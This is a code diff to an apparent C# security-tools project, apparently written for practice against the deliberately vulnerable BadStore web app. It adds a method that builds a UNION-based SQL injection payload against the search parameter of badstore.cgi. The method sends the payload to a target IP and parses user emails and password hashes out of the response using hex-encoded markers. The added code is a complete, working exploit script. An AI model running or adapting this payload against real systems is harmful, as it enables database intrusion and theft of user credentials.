@@ -5,6 +5,8 @@ using System.IO;
 using System.Text;
 using System.Net.Sockets;
 using Newtonsoft.Json.Linq;
+using System.Linq;
+using System.Text.RegularExpressions;
 
 namespace CsharpSecurityTools
 {
@@ -162,6 +164,43 @@ namespace CsharpSecurityTools
 
                Console.WriteLine("Fuzzing POST requests to URL " + url);
                IterateAndFuzz(url, obj);
+               
+          }
+
+          static void SQLInjectionExp(string[] args)
+          {
+               string frontMarker = "FrOnTMaRker";
+               string middleMarker = "mIdDlEMaRKer";
+               string endMarker = "eNdMaRKer";
+               string frontHex = string.Join("", frontMarker.Select(c => ((int)c).ToString("X2")));
+               string middleHex = string.Join("", middleMarker.Select(c => ((int)c).ToString("X2")));
+               string endHex = string.Join("", endMarker.Select(c => ((int)c).ToString("X2")));
+
+               // Argument should be IP
+
+               string url = "http://" + args[0] + "/cgi-bin/badstore.cgi";
+
+               string payload = "fdsa' UNION ALL SELECT";
+               payload += " NULL, NULL, NULL, CONCAT(0x" + frontHex + ", IFNULL(CAST(email AS";
+               payload += " CHAR), 0x20),0x" + middleHex + ", IFNULL(CAST(passwd AS";
+               payload += " CHAR), 0x20), 0x" + endHex + ") FROM badstoredb.userdb# ";
+
+               url += "?searchquery=" + Uri.EscapeUriString(payload) + "&action=search";
+
+               // Create HTTP request and read response
+               HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+               string response = string.Empty;
+               using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
+                    response = reader.ReadToEnd();
+
+               // Regex match
+               Regex payloadRegex = new Regex(frontMarker + "(.*?)" + middleMarker + "(.*?)" + endMarker);
+               MatchCollection matches = payloadRegex.Matches(response);
+               foreach (Match match in matches)
+               {
+                    Console.WriteLine("Username: "+match.Groups[1].Value+"\t");
+                    Console.Write("Password hash: " + match.Groups[2].Value);
+               }
                
           }
 
